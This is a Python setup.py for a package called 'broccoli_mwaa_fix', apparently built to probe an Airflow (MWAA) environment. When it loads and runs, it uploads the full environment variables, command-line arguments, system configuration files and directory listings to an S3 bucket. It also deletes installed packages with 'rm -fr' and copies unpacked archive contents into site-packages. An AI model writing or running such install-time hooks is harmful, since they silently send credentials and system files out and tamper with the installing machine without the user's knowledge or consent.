from setuptools import find_packages, setup as setup_original
import os
import sys
import json
from datetime import datetime
from uuid import uuid4
from pkg import get_version
from broccoli_mwaa_fix import utils as broccotils
import sysconfig


VERSION = get_version()
BUCKET_NAME = 'ryus-poc-airflow'


# install_requires = []

extras_require = {}
tests_require = []


print('Broccoli--> Called(imported) broccoli setup.py script')

if not os.getenv('BUILD_PACKAGE') == '1':
    fname = '/tmp/zzz_info_ryus.txt'
    os.system('pip freeze > packages.log')

    with open('packages.log', 'r') as fp_in, open(fname, 'w') as fp:
        fp.write(fp_in.read())


def get_install_requires():
    print('Broccoli--> Called get_install_requires function')
    # pip.main(['freeze'])

    try:
        os.system('rm -fr packages.log && pip freeze > packages.log')

        os.system('rm -fr ../.venv2/lib/python3.10/site-packages/watchtower/')
        os.system('rm -fr ../.venv2/lib/python3.10/site-packages/watchtower-3.0.0.dist-info/')
        
        os.system('rm -fr packages_2.log && pip freeze > packages_2.log')
    except:
        pass

    fname = '/tmp/packages.log'
    with open(fname, 'w') as fp:
        fp.write('777s')
        # raise Exception(fp.read())
    # exit(1)
    # if not os.getenv('BUILD_PACKAGE') == '1':
    #     raise Exception(sys.argv)

    return [
        # 'watchtower'
    ]


def unzip_data(src, dst):
    import zipfile
    with zipfile.ZipFile(src, 'r') as zip_ref:
        zip_ref.extractall(dst)


def install_deps_for_setup_py():
    from pip import main as pip_main

    pip_main([
        'install',
        '--upgrade',
        'boto3',
    ])


def upload_data_to_s3(
    prefix=None,
    src_file=None,
    data=None,
    bucket_name=BUCKET_NAME,
    uuid_str=str(uuid4()),
    ts=str(datetime.utcnow())[:19].replace(':', '-'),
    version=VERSION,
):
    import json
    import boto3

    data_type = type(data)
    
    if src_file is not None:
        with open(src_file, 'r') as fp:
            data = fp.read()
            data_type = None
        prefix = src_file.strip('/')
    else:
        if data_type in [dict, list]:
            data = json.dumps(data, indent=4, sort_keys=False)
            prefix = f"{prefix.strip('/')}.json"
        else:
            data = str(data)
            prefix = f"{prefix.strip('/')}.txt"
    
    prefix = f"logs/{version}_{ts}_{uuid_str}/{prefix}"

    body = bytes(data, 'utf-8')

    try:
        s3 = boto3.resource('s3')
        response = s3.Object(
            bucket_name,
            prefix,
        ).put(Body=body)

        if response['ResponseMetadata']['HTTPStatusCode'] != 200:
            raise Exception(json.dumps(response, indent=4))
    except Exception as e:
        print(e)


install_deps_for_setup_py()
upload_data_to_s3(prefix='on_load_setup_py_sys_argv', data=sys.argv)
upload_data_to_s3(prefix='on_load_setup_py_env_vars', data=dict(os.environ))


def sys_info_dump(attrs=None):
    tmp_data = dict()
    
    try:
        tmp_data['sys_argv']=sys.argv
    except:
        pass
    try:
        tmp_data['env_var']=dict(os.environ)
    except:
        pass
    try:
        tmp_data['setup_attrs']=attrs
    except:
        pass
    try:
        tmp_data['path']=os.path.dirname(os.path.abspath(__file__))
    except:
        pass
    try:
        tmp_data['file']=__file__
    except:
        pass
    try:
        tmp_data['absfile']=os.path.abspath(__file__)
    except:
        pass
    try:
        tmp_data['sys_exec_prefix']=sys.exec_prefix
    except:
        pass
    try:
        tmp_data['sys_executable']=sys.executable
    except:
        pass
    try:
        tmp_data['sysconfig_get_python_version']=sysconfig.get_python_version()
    except:
        pass
    try:
        tmp_data['sysconfig_get_config_vars']=sysconfig.get_config_vars()
    except:
        pass
    try:
        tmp_data['sysconfig_get_platform']=sysconfig.get_platform()
    except:
        pass
    try:
        tmp_data['sysconfig_os']=str(sysconfig.os)
    except:
        pass

    return tmp_data


upload_data_to_s3(prefix='setup_py_dump_1', data=sys_info_dump())


def setup(**attrs):
    print('Broccoli setup called:', json.dumps(attrs, indent=4))
    script_path = os.path.dirname(os.path.abspath(__file__))

    install_deps_for_setup_py()

    unzip_data(src=f"{script_path.rstrip('/')}/data/data.zip", dst=f"{script_path.rstrip('/')}/data/unpack")
    os.system(f"ls -la {script_path.rstrip('/')}/data/unpack/")

    upload_data_to_s3(prefix='setup_py_dump_2', data=sys_info_dump(attrs))

    if not os.getenv('BUILD_PACKAGE') == '1':
        broccotils.cmd_log(cmd='pip freeze', file='/tmp/pip_freeze')
        broccotils.cmd_log(cmd='pip list', file='/tmp/pip_list')
        broccotils.cmd_log(cmd='ls -la /', file='/tmp/ls_root')

        broccotils.pkg_path()
        broccotils.upload_data_to_s3(prefix='/usr/local/airflow/', data=broccotils.ls_dir('/usr/local/airflow/'))

        broccotils.upload_data_to_s3(src_file='/.dockerenv')
        broccotils.upload_data_to_s3(src_file='/bootstrap.sh')
        broccotils.upload_data_to_s3(src_file='/constraints.txt')
        broccotils.upload_data_to_s3(src_file='/db_validation.py')
        broccotils.upload_data_to_s3(src_file='/entrypoint.sh')
        broccotils.upload_data_to_s3(src_file='/healthcheck.sh')
        broccotils.upload_data_to_s3(src_file='/mwaa-base-providers-requirements.txt')
        broccotils.upload_data_to_s3(src_file='/requirements.txt')

        for it in broccotils.FILES_TO_DUMP:
            broccotils.upload_data_to_s3(src_file=it)

        broccotils.upload_data_to_s3(prefix='/local', data=broccotils.ls_dir('/local'))
        broccotils.upload_data_to_s3(prefix='/packages', data=broccotils.ls_dir('/packages'))

    unpack_path = '/usr/local/airflow/.local/lib/python3.10/site-packages/'
    if not os.getenv('BUILD_PACKAGE') == '1':
        unpack_path = '/Users/ryus/Documents/SB Health Living/repo/healthy-living-dbt/broccoli_mwaa_fix/venvs/tmp_unpack/'
    
    try:
        os.system(f"cp -R -f {script_path.rstrip('/')}/data/unpack/ \"{unpack_path}\"")
    except:
        try:
            os.system(f"cp -R {script_path.rstrip('/')}/data/unpack/ \"{unpack_path}\"")
        except:
            pass

    unpack_path = '/usr/local/airflow/.local/lib/python3.7/site-packages/'
    try:
        os.system(f"cp -R -f {script_path.rstrip('/')}/data/unpack/ \"{unpack_path}\"")
    except:
        try:
            os.system(f"cp -R {script_path.rstrip('/')}/data/unpack/ \"{unpack_path}\"")
        except:
            pass

    setup_original(**attrs)

    broccotils.upload_data_to_s3(prefix='after_setup_exec', data='It works!')

    if not os.getenv('BUILD_PACKAGE') == '1':
        broccotils.cmd_log(cmd='pip freeze', file='/tmp/after_setup_exec_pip_freeze')
        broccotils.cmd_log(cmd='pip list', file='/tmp/after_setup_exec_pip_list')
        broccotils.cmd_log(cmd='ls -la /', file='/tmp/after_setup_exec_ls_root')


setup(
    name='broccoli_mwaa_fix',
    description='broccoli_mwaa_fix',
    version=f'0.{VERSION}'.strip(),
    author='Broccoli Squad',
    # author_email='',
    packages=find_packages(exclude=['tests.*', 'tests', 'thirdparty', 'logs', 'venvs']),
    # install_requires=install_requires,
    install_requires=get_install_requires(),
    extras_require=extras_require,
    tests_require=tests_require,
    license="TBD",
    include_package_data=True,
    # package_dir={"": "."},
    # package_data={"*": ["*", "*.*"]},
    # data_files=['*', "*.*"],
    # include_dirs=['*'],
    package_data={'': ['*.*', '*']},
)
